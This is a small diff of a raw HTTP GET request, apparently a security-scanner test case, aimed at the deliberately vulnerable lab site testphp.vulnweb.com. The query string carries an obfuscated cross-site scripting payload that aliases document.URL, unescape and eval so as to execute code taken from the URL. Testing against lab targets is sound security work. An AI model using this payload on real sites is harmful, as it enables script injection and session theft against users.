@@ -1,5 +1,4 @@
 GET /search.php?test=query$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))%0
-
 HTTP/1.1
 Host: testphp.vulnweb.com
 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36
